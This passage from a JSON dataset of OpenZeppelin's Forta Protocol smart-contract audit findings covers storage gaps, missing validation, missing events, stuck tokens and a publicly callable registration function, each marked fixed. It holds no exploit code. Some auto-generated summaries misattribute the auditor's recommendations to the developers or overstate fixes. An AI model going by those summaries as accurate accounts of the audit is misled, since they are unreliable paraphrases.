57](https://github.com/forta-protocol/forta-token/pull/57/commits/2a7391dff896384174ca49ff960d889120961a4e).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10593",
      "title": "Inconsistent slot size for upgrades",
      "impact": "LOW",
      "content": "Throughout the whole codebase, several contracts are allowed to be upgradable in order to improve/extend the functionalities or to fix a vulnerability. To mitigate the possibility of having a storage collision, those contracts define an array at the bottom of the contract that its length added to the number of variables defined in the contract adds to a fix number, usually 50.\n\n\nHowever, there are contracts in which the sum is not consistent with the rest of the codebase. In particular:\n\n\n* TheÂ [`ScannerRegistryManaged`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryManaged.sol#L44)Â whose sum adds up to 45.\n* TheÂ [`StakeAwareUpgradeable`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/utils/StakeAware.sol#L40)Â whose sum adds up to 5.\n* TheÂ [`AgentRegistryCore`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/agents/AgentRegistryCore.sol#L83)Â whose sum adds up to 45.\n\n\nIn order to improve the codeâ€™s readability, prevent future storage collisions on contracts that may have less storage slots available, and to be consistent with the rest of the code, consider fixing all the respective places where the sum does not add up to a common fixed number. Furthermore, consider documenting as in-line comments all the variables that took one of those places as documentation for theÂ `__gap`Â variable as an exercise to double corroborate its final length.\n\n\n***Update:**Â Fixed inÂ [pull request 45](https://github.com/forta-protocol/forta-token/pull/45)Â and onÂ [commitÂ `4a49ba4bdc53702fe199d06d249a0e961ee8385b`Â in pull request 77](https://github.com/forta-protocol/forta-token/pull/77/commits/4a49ba4bdc53702fe199d06d249a0e961ee8385b). The team hasÂ [explicitly described](https://github.com/forta-protocol/forta-token/pull/77#issue-1141608847)Â the slot usages in those files and added upgradeability information in theÂ `README.md`Â file to mitigate future problems.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10592",
      "title": "Add information inÂ _emitHookÂ calls",
      "impact": "LOW",
      "content": "Within theÂ `FortaStaking`Â contract, there are many calls to theÂ [`_emitHook`Â function for the hookÂ `hook_afterStakeChanged`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L215). However, this hook only includes two parameters:Â `subjectType`Â andÂ `subject`. Note that identical calls are made in theÂ [`deposit`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L215),Â [`initiateWithdrawal`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L246),Â [`withdraw`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L276), and theÂ [`slash`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L309)Â functions.\n\n\nIf it is eventually needed to determine which user triggered a stake change, which userâ€™s stake has changed, by how much a stake has changed, or what function resulted in the stake change, a call into theÂ `FortaStaking`Â contract will be needed, possibly alongside complex logic in an external contract.\n\n\nConsider passing relevant data with the calls toÂ `_emitHook`, such asÂ `_msgSender`Â andÂ `changeInStake`. Doing so will make it easier for the contract receiving the hook to interpret what has happened. Additionally, consider documenting the purposes of the hooks for future development, so it is clear exactly which data may be needed from theÂ `hook_afterStakeChanged`Â call.\n\n\n***Update:**Â Fixed onÂ [commitÂ `0d91a544de1540459b71167dfdf318bb11acf6a6`Â in pull request 76](https://github.com/forta-protocol/forta-token/pull/76/commits/0d91a544de1540459b71167dfdf318bb11acf6a6).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10591",
      "title": "TODOs and comments implying unfinished code",
      "impact": "LOW",
      "content": "There are â€œTODOâ€ comments and other comments implying unfinished codes in the codebase. These should be tracked in the projectâ€™s issues backlog. In particular:\n\n\n* [Line 38 ofÂ `AgentRegistryCore.sol`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/agents/AgentRegistryCore.sol#L38).\n* [Line 54 ofÂ `AgentRegistryCore.sol`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/agents/AgentRegistryCore.sol#L54).\n* [Line 35 ofÂ `Router.sol`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/router/Router.sol#L35), which seems to imply the development effort here is unfinished.\n\n\nDuring development, having well described â€œTODOâ€ comments will make the process of tracking and solving them easier. Without that information, these comments might tend to rot and important information for the security of the system might be forgotten by the time it is released to production.\n\n\nThese TODO comments should at least have a brief description of the task pending to do, and a link to the corresponding issue in the project repository.\n\n\nConsider updating these comments to add this information. For completeness and traceability, a signature and a timestamp can be added.\n\n\n***Update:**Â Fixed onÂ [commitÂ `d02065f071cd94d1361e00ff2b5208f71d76d014`Â in pull request 73](https://github.com/forta-protocol/forta-token/pull/73/commits/d02065f071cd94d1361e00ff2b5208f71d76d014)Â and onÂ [commitÂ `1f19717cc711522afb05299c8c3e05238484de0d`Â in pull request 75](https://github.com/forta-protocol/forta-token/pull/75/commits/1f19717cc711522afb05299c8c3e05238484de0d). However, now theÂ `AGENT_ADMIN_ROLE`Â role can ban any creation by frontrunning the senderâ€™s transaction and changing theÂ `frontRunningDelay`Â variable.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10590",
      "title": "Slashing process could be reverted",
      "impact": "MEDIUM",
      "content": "When a certain subject under-performed or has done actions against the correct operation of the protocol, theÂ `SLASHER_ROLE`Â role can slash that subject and all the users that have staked on it by calling theÂ [`slash`Â function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L286)Â from theÂ `FortaStaking`Â contract. After theÂ [value that should be taken from inactive and active stake is computed](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L299-L300), the slashed funds areÂ [transferred to theÂ `_treasury`Â address](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L305).\n\n\nHowever, if theÂ `_treasury`Â address is being set as zero either during theÂ [initialization](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L117)Â of the contract or by theÂ `DEFAULT_ADMIN_ROLE`Â role with theÂ [`setTreasury`Â function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L493), the whole slashing mechanism will not work because theÂ `FORT`Â tokenÂ [does not allow to transfer tokens to the zero address](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v4.4.2/contracts/token/ERC20/ERC20Upgradeable.sol#L233).\n\n\nIn order to prevent the possible reversion of the slashing process, consider always validating that theÂ `_treasury`Â address is not zero when initializing the contract or when a new treasury address is being set.\n\n\n***Update:**Â Fixed onÂ [commitÂ `b2c4d5aa398530d1ae5af14cf84eb438a377af5e`Â in pull request 56](https://github.com/forta-protocol/forta-token/pull/56/commits/b2c4d5aa398530d1ae5af14cf84eb438a377af5e).*",
      "summary": "\nThis bug report is about the FortaStaking contract from the Forta protocol. The SLASHER_ROLE role has the ability to slash a subject and all the users that have staked on it by calling the slash function. The value that should be taken from inactive and active stake is calculated and the slashed funds are transferred to the _treasury address.\n\nHowever, if the _treasury address is set as zero either during the initialization of the contract or by the DEFAULT_ADMIN_ROLE role with the setTreasury function, the slashing mechanism will not work because the FORT token does not allow to transfer tokens to the zero address.\n\nIn order to prevent this potential issue, it is necessary to validate that the _treasury address is not zero when initializing the contract or when a new treasury address is being set. This issue has been fixed on commit b2c4d5aa398530d1ae5af14cf84eb438a377af5e in pull request 56.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10589",
      "title": "L2 tokens could get stuck",
      "impact": "MEDIUM",
      "content": "TheÂ [`release`Â function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/escrow/StakingEscrow.sol#L118)Â in theÂ `StakingEscrow`Â contract allows users to send tokens from theÂ `StakingEscrow`Â contract to another account on L2. However, in order to preserve the vesting schedule, FORT tokens are NOT allowed to be transferred unless they have beenÂ [accounted for byÂ `pendingReward`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/escrow/StakingEscrow.sol#L119-L121).\n\n\nTypically if tokens are received as rewards from the staking contract,Â `pendingReward`Â will be increased. However, if tokens are sent directly to this contract, it will not increaseÂ `pendingReward`Â and the tokens will not be transferable. Instead, users will only be able toÂ [`bridge`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/escrow/StakingEscrow.sol#L148-L150)Â their FORT tokens, subjecting them to the vesting schedule on L1.\n\n\nConsider implementing some accounting to allow for users to transfer FORT tokens to this contract, and afterwards transfer them out via theÂ [`release`Â function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/escrow/StakingEscrow.sol#L118). Alternatively, consider making a clear warning to anyÂ `StakingEscrow`Â contract users that FORT tokens transferred to the contract will not beÂ `release`-able and will be subjected to vesting.\n\n\n***Update:**Â Fixed onÂ [commitÂ `9d821024623005808eddd6765d8260f1d2a2301d`Â in pull request 55](https://github.com/forta-protocol/forta-token/pull/55/commits/9d821024623005808eddd6765d8260f1d2a2301d). A warning has been added to let users know about this behavior.*",
      "summary": "\nThis bug report is about the `release` function in the `StakingEscrow` contract. This function allows users to send tokens from the `StakingEscrow` contract to another account on L2. However, in order to preserve the vesting schedule, FORT tokens are not allowed to be transferred unless they have been accounted for by `pendingReward`. This happens when tokens are received as rewards from the staking contract, and `pendingReward` is increased. If tokens are sent directly to this contract, it will not increase `pendingReward` and the tokens will not be transferable. \n\nIn order to solve this issue, the developers considered implementing some accounting to allow for users to transfer FORT tokens to this contract, and afterwards transfer them out via the `release` function. Alternatively, they considered making a clear warning to any `StakingEscrow` contract users that FORT tokens transferred to the contract will not be `release`-able and will be subjected to vesting. The bug has been fixed on commit `9d821024623005808eddd6765d8260f1d2a2301d` in pull request 55. A warning has been added to let users know about this behavior.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10588",
      "title": "Staked funds might get soft-stuck",
      "impact": "MEDIUM",
      "content": "TheÂ [`FortaStaking`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L45)Â implements the functionality to allow holders to stake their funds (vested or not) into a subject and collect rewards by doing so. The contract uses 2 different accounting systems to handle the assets: aÂ [`Distribution`Â type based for the asset in stake units](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L53-L56)Â and the innerÂ [ERC1155 accounting system](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L45)Â for the associated shares. When a userÂ [stakes](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L201), the contractÂ [mints new active shares](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L213). When a userÂ [wants to withdraw](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L224), the contractÂ [burns those active shares](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L241)Â andÂ [mints inactive ones](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L242).\n\n\nWhen minting these ERC1155, theÂ [`_doSafeTransferAcceptanceCheck`Â hook](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v4.4.2/contracts/token/ERC1155/ERC1155Upgradeable.sol#L421)Â will get triggered and it would check if the destinatary is aÂ `ERC1155Receiver`Â implementer or not when it detects that the address has code in it.\n\n\nHowever, if the minting process happens during the constructor of a non-fully compatible ERC1155 wallet, theÂ `FortaStaking`Â contract would treat the destinatary as a regular EOA during the minting process. Then, once it is deployed, the wallet will not be able to mint new shares due to the sameÂ `_doSafeTransferAcceptanceCheck`Â hook as it will get triggered, failing at the same validation that was skipped on the first deposit.\n\n\nThis means that when the walletÂ [starts the process to withdraw the assets](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L224), the transaction will fail during theÂ [minting of inactive shares](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L242). Nevertheless, the user may transfer those active shares to a fully compatible wallet to then initiate the withdrawal process once again.\n\n\nIn favor of improving the usability of the protocol, consider documenting the requirements that 3rd party wallets would need to be able to fully interact with it either during the deployment stage or once it has been deployed.\n\n\n***Update:**Â Fixed onÂ [commitÂ `d13be24e8b84ffc59eb04ded2d03841a69996434`Â in pull request 54](https://github.com/forta-protocol/forta-token/pull/54/commits/d13be24e8b84ffc59eb04ded2d03841a69996434).*",
      "summary": "\nThe FortaStaking contract implements the functionality to allow holders to stake their funds into a subject and collect rewards. It uses two different accounting systems to handle the assets: a Distribution type based for the asset in stake units and the inner ERC1155 accounting system for the associated shares. When a user stakes, the contract mints new active shares. When a user wants to withdraw, the contract burns those active shares and mints inactive ones. \n\nHowever, if the minting process happens during the constructor of a non-fully compatible ERC1155 wallet, the FortaStaking contract would treat the destinatary as a regular EOA during the minting process. Then, once it is deployed, the wallet will not be able to mint new shares due to the _doSafeTransferAcceptanceCheck hook as it will get triggered, failing at the same validation that was skipped on the first deposit. This means that when the wallet starts the process to withdraw the assets, the transaction will fail during the minting of inactive shares. \n\nIn order to improve the usability of the protocol, consider documenting the requirements that 3rd party wallets would need to be able to fully interact with it either during the deployment stage or once it has been deployed. The issue has been fixed on commit d13be24e8b84ffc59eb04ded2d03841a69996434 in pull request 54.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10587",
      "title": "Lack of validation",
      "impact": "MEDIUM",
      "content": "Throughout the codebase, there are places where a proper input/output validation is lacking. In particular:\n\n\n* In theÂ [`Router`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/router/Router.sol#L14), whenÂ [adding](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/router/Router.sol#L44)Â orÂ [removing](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/router/Router.sol#L46)Â an element from the routing table, the methods return a boolean to inform the success of the call, but this output is never used or validated by theÂ `Router`Â contract.\n* Similarly to the case from above, in theÂ [`ScannerRegistryManaged`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryManaged.sol#L8), whenÂ [adding](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryManaged.sol#L37)Â orÂ [removing](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryManaged.sol#L39)Â a manager from storage, its methodâ€™s output is never validated.\n* InÂ [`Routed.sol`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/utils/Routed.sol#L7), the variable assignment in linesÂ [13](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/utils/Routed.sol#L13)Â andÂ [25](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/utils/Routed.sol#L25)Â are not validating if the address corresponds to a contract or if it is the zero address.\n* In theÂ [`FortaStaking`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L45)Â it is possible toÂ [initiate a withdrawal](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L224)Â andÂ [set in storage a deadline](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L233)Â for a inexistent stake,Â [emit several events](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L241-L244)Â during the process, andÂ [trigger an external hook](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L246).\n\n\nA lack of validation on user-controlled parameters may result in erroneous or failing transactions that are difficult to debug. To avoid this, consider adding input and output validation to address the concerns raised above and in any other place when appropriate.\n\n\n***Update:**Â Partially fixed onÂ [commitÂ `85d6bd7518efd3a759789225b7dc07d4c26fa7fd`Â in pull request 53](https://github.com/forta-protocol/forta-token/pull/53/commits/85d6bd7518efd3a759789225b7dc07d4c26fa7fd). The team has acknowledged the lack of validation but it will not be enforced on all the mentioned places. The teamâ€™s response for the issue:*\n\n\n\n> *NOTE: ignoring EnumerableSet.add() bool output; We donâ€™t care if already added.*\n> \n>",
      "summary": "\nThis bug report is about the lack of input/output validation in the codebase of the Forta Token. In particular, the methods in the `Router` and `ScannerRegistryManaged` contracts do not validate the boolean output when adding or removing elements from the routing table or storage. The `Routed.sol` contract does not validate if the address corresponds to a contract or if it is the zero address. The `FortaStaking` contract does not check if a stake exists before initiating a withdrawal and setting a deadline in storage.\n\nThe lack of validation on user-controlled parameters could lead to erroneous or failing transactions that are difficult to debug. To prevent this, input and output validation should be added to the codebase. The team has partially fixed the issue on `85d6bd7518efd3a759789225b7dc07d4c26fa7fd` commit in pull request 53, but the team has decided to ignore the boolean output of the `EnumerableSet.add()` method.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10586",
      "title": "Unclear initialization of inherited contracts",
      "impact": "MEDIUM",
      "content": "TheÂ [`StakeAwareUpgradeable`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/utils/StakeAware.sol#L9)Â is inherited by a few contracts, such as theÂ [`ScannerRegistryEnable`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L9), and therefore any other contract that inherits from those, such as theÂ [`ScannerRegistry`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistry.sol#L11).\n\n\nHowever, even though theÂ `ScannerRegistry`Â contract implements theÂ [`initialize`Â function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistry.sol#L22)Â that initializesÂ [all the respective imports](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistry.sol#L28-L31), there is no call to theÂ [`__StakeAwareUpgradeable_init`Â function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/utils/StakeAware.sol#L14)Â from theÂ `StakeAwareUpgradeable`Â contract. Furthermore, there is no single location in the whole codebase that would call the initializer to set the respective stake controller.\n\n\nMoreover, theÂ [`FortaStaking`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L45)Â is inheriting the functionalities from theÂ [`ERC1155SupplyUpgradeable`Â contract](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/06ab69e525435f2f4487e72676522fda670244cb/contracts/token/ERC1155/extensions/ERC1155SupplyUpgradeable.sol#L17)Â but itsÂ [`__ERC1155Supply_init`Â function](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/06ab69e525435f2f4487e72676522fda670244cb/contracts/token/ERC1155/extensions/ERC1155SupplyUpgradeable.sol#L18)Â is never initialized.\n\n\nConsider calling all the respective initialization functions when inheriting functionalities from other contracts.\n\n\n***Update:**Â Fixed onÂ [commitÂ `b7f5eb26fdb87a5c45392d6a6468d873a86ea450`Â in pull request 52](https://github.com/forta-protocol/forta-token/pull/52/commits/b7f5eb26fdb87a5c45392d6a6468d873a86ea450). More documentation was added to describe the lack of initialization on upgraded contracts.*",
      "summary": "\nThis bug report is about a few contracts, such as the StakeAwareUpgradeable and ScannerRegistryEnable, that are inherited by other contracts, like the ScannerRegistry. The ScannerRegistry implements the initialize function, which initializes all the imports, but there is no call to the __StakeAwareUpgradeable_init function from the StakeAwareUpgradeable contract. Additionally, the FortaStaking contract, which inherits from the ERC1155SupplyUpgradeable contract, does not have the __ERC1155Supply_init function initialized. To fix this issue, it is suggested to call all the respective initialization functions when inheriting functionalities from other contracts. This issue has been fixed on the commit b7f5eb26fdb87a5c45392d6a6468d873a86ea450 in pull request 52 and more documentation has been added to describe the lack of initialization on upgraded contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10585",
      "title": "Lack of event emission after sensitive actions",
      "impact": "MEDIUM",
      "content": "The following function do not emit relevant events after executing sensitive actions.\n\n\n* TheÂ [`sweep`Â function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L348)Â of theÂ `FortaStaking`Â contract, after theÂ `SWEEPER_ROLE`Â role withdraws all mistakenly sent tokens to the contract.\n\n\nConsider emitting events after sensitive changes take place (including the first event emission in the constructor when appropriate), to facilitate tracking and notify off-chain clients following the contractsâ€™ activity\n\n\n***Update:**Â Fixes onÂ [commitÂ `d0934556c8331ccb806a606622bbd8b9f10c301b`Â in pull request 51](https://github.com/forta-protocol/forta-token/pull/51/commits/d0934556c8331ccb806a606622bbd8b9f10c301b).*",
      "summary": "\nThis bug report is about an issue with the `sweep` function of the `FortaStaking` contract. When the `SWEEPER_ROLE` role withdraws all mistakenly sent tokens to the contract, no relevant events are emitted. This could make it difficult to track and notify off-chain clients following the contractsâ€™ activity. To fix the issue, the commit `d0934556c8331ccb806a606622bbd8b9f10c301b` in pull request 51 was implemented. This commit ensures that events are emitted after sensitive changes take place, including the first event emission in the constructor when appropriate.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10584",
      "title": "__gapÂ missing in upgradeable contracts",
      "impact": "MEDIUM",
      "content": "The contractsÂ [`VestingWallet`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/VestingWallet.sol)Â andÂ [`VestingWalletV2`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/VestingWalletV2.sol)Â do not contain aÂ `__gap`Â variable although they are upgradeable.\n\n\nConsider adding a correctÂ `__gap`Â variable to these contracts, or documenting a plan for managing storage collisions when upgrading the Vesting Wallet. Additionally, since upgradeable contracts withÂ `__gap`s are used in many places within the contracts, consider implementing quality control steps for upgradeable contract development. For instance, make it a priority to check allÂ `__gap`Â variables before pushing any new code commits, as well as leaving comments next to all variables in a contract indicating which storage slots they belong in. Consider leaving deprecated variables in the code, and leaving comments about the fact that they were deprecated to avoid confusion for future developers. Finally, consider implementing a predictable inheritance structure for all contracts and documenting it within each contract. Implementing these steps will reduce the surface for error and in the long run may save developer time by removing confusion about the storage layout of the contracts.\n\n\n***Update:**Â Fixed onÂ [commitÂ `9b37ac5d4b852954552c69e33bf7f35de051d5b3`Â in pull request 50](https://github.com/forta-protocol/forta-token/pull/50/commits/9b37ac5d4b852954552c69e33bf7f35de051d5b3). The originalÂ `VestingWallet`Â contract without upgradeability slots was kept as theÂ `VestingWalletV0`Â contract and further extensions of it now include theÂ `__gap`Â slots variable.*",
      "summary": "\nThis bug report discusses two contracts, VestingWallet and VestingWalletV2, which are upgradeable but do not contain a __gap variable. A __gap variable is necessary to manage storage collisions when upgrading the Vesting Wallet. To prevent errors, the report suggests implementing quality control steps such as checking all __gap variables before pushing code commits, leaving comments next to variables, and implementing a predictable inheritance structure for all contracts. The bug was fixed in commit 9b37ac5d4b852954552c69e33bf7f35de051d5b3 in pull request 50. The original VestingWallet contract without upgradeability slots was kept as the VestingWalletV0 contract and further extensions of it now include the __gap slots variable.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10583",
      "title": "Malicious user can register a scanner under any owner",
      "impact": "HIGH",
      "content": "TheÂ [`ScannerRegistryCore`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryCore.sol#L8)Â implements the functionality to allow the registration and minting of new scanners.\n\n\nNew scanners are meant to be registered by either calling theÂ [`register`Â function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryCore.sol#L27)Â from the scannerâ€™s address or through the trusted forwarder, or by the admin when calling theÂ [`adminRegister`Â function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryCore.sol#L19). These functions then call theÂ [`_register`Â function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryCore.sol#L31)Â which implements the rest of the registration.\n\n\nHowever, thisÂ `_register`Â function is marked as aÂ `public`Â function, meaning that any user could skip the checks and register a scanner in the same way as the admin does it.\n\n\nIn favor of restricting the admin functionalities to regular users, consider changing the visibility of theÂ `_register`Â function toÂ `internal`.\n\n\n***Update:**Â Fixed onÂ [commitÂ `11bb25a9034f19be44315203713bf94d138698b8`Â in pull request 